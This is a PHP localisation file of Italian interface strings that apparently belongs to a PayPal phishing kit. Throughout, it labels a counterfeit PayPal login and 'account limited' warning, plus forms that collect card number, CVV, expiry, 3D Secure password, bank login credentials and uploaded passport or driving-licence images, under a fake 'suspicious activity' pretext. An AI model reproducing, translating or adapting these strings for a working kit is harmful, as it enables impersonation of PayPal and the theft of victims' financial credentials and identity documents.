<?php
#LOGIN
$wiz_111 = 'Accedi al tuo conto PayPal';
$wiz_222 = 'Avendo problemi di accesso?';
$wiz_333 = 'Registrazione';
$wiz_444 = 'Tutti i diritti sono riservati a PayPal Inc';
$wiz_900 = 'E-mail';
$wiz_901 = "parola d'ordine";
$wiz_902 = 'Accesso';
#INFO
$wiz_555 = 'Profilo';
$wiz_666 = 'Aggiornare La tua foto';
$wiz_777 = 'Ciao di nuovo!';
$wiz_888 = 'Il tuo account PayPal è stato limitato!';
$wiz_999 = 'Informazioni richieste';
$wiz_903 = 'Nome';
$wiz_904 = 'Cognome';
$wiz_905 = 'Indirizzo';
$wiz_906 = 'Città';
$wiz_907 = 'Stato';
$wiz_910 = 'cerniera lampo';
$wiz_911 = 'Numero di telefono';
#-----NAV
$wiz_101 = 'Sommario';
$wiz_102 = 'Attività';
$wiz_103 = 'Trasferimento';
$wiz_104 = 'Portafoglio';
$wiz_105 = 'Riviste';
$wiz_106 = 'Disconnettersi';
$wiz_107 = 'Menu principale';
$wiz_108 = 'Account';
$wiz_109 = 'Sicurezza';
$wiz_112 = 'Pagamenti';
$wiz_113 = 'Notifiche';
#------FOOTER
$wiz_114 = 'Aiuto / Contatto';
$wiz_115 = 'Sicurezza';
$wiz_116 = 'Tutti i diritti riservati.';
$wiz_117 = 'Rispetto della vita privata';
$wiz_118 = 'Accordi Legali';
$wiz_119 = 'Commenti';
#-------CCV
$wiz_120 = 'Carta Di Credito';
$wiz_121 = 'Nome Sulla Carta';
$wiz_123 = 'Numero Di Carta';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Indirizzo Riga';
$wiz_127 = 'Conferma e Processi';
#--------VBV
$wiz_128 = 'Benvenuti a verifica™';
$wiz_129 = 'per verificare la vostra identità Si prega di inserire le informazioni qui di seguito.';
$wiz_130 = 'Carta Data di scadenza:';
$wiz_131 = 'Code Card Validation:';
$wiz_132 = 'Data Di Nascita:';
$wiz_133 = 'Password o SecureCode (3d) :';
$wiz_134 = 'Tutti i diritti riservati.';
#--------BANK
$wiz_135 = 'Scegli tra una di queste banche commun';
$wiz_136 = 'Sicuro';
$wiz_137 = 'Ho una banca differente';
$wiz_138 = "E 'sicuro di condividere queste informazioni. PayPal non salvarlo.";
$wiz_139 = 'Cliccando';
$wiz_140 = 'Proseguire';
$wiz_141 = 'Accetto i termini e le condizioni per collegare il mio conto in banca.';
$wiz_142 = 'La vostra banca';
$wiz_143 = "E 'sicuro di condividere queste informazioni. PayPal non salvarlo.";
$wiz_144 = 'Username';
$wiz_145 = "parola d'ordine";
$wiz_146 = 'Cliccando';
$wiz_147 = 'proseguire';
$wiz_148 = 'Accetto i termini e le condizioni per collegare il mio conto in banca.';
$wiz_149 = 'La vostra banca';
$wiz_150 = 'nome della banca';
#--------Loading AND Police
$wiz_151 = 'lavorazione';
$wiz_152 = 'Attività sospette - PAYAPL';
$wiz_153 = 'Per proteggere il tuo account non vediamo regolarmente per i primi segni di attività potenzialmente fraudolenti.';
$wiz_154 = 'Siamo preoccupati per il potenziale attività non autorizzate';
$wiz_155 = 'Dopo aver confermato la propria identità, ti guideremo attraverso i passaggi per rendere il vostro conto più sicuro.';
$wiz_156 = 'Effettua il login da un dispositivo sconosciuto';
$wiz_157 = 'nei pressi di Ossining, Stati Uniti';
$wiz_158 = 'Giusto per essere sicuro, vogliamo fare in modo che questo è il tuo account.';
$wiz_159 = 'contatto';
$wiz_160 = 'Sicurezza';
$wiz_161 = 'Disconnettersi';
$wiz_162 = 'I passaggi seguenti, è necessario completamente riempiti di mantenere la sicurezza del tuo account finita e che lui non è un passo avanti';
#--------UPLOAD CART ID
$wiz_163 = 'conferma la tua identità';
$wiz_164 = 'Selezionare';
$wiz_165 = "Carica documento d'identità (scelta consigliata)";
$wiz_166 = 'Ricevere un testo';
$wiz_167 = 'Ricevere una telefonata automatica';
$wiz_168 = 'Errore questa opzione non è disponibile per un attimo Prova altre opzioni';
$wiz_169 = 'Quale tipo di documento farete caricare?';
$wiz_170 = 'requisiti Mostra il file';
$wiz_171 = 'I file devono essere inferiori a 10 MB.';
$wiz_172 = 'Utilizzare uno di questi tipi di file: JPG, GIF, PNG o PDF.';
$wiz_173 = 'Pubblicare file che visualizzano up-to-date e dettagli leggibili.';
$wiz_174 = 'Selezionare una';
$wiz_175 = "Patente di guida";
$wiz_176 = 'Passaporto';
$wiz_177 = 'ID militare';
?>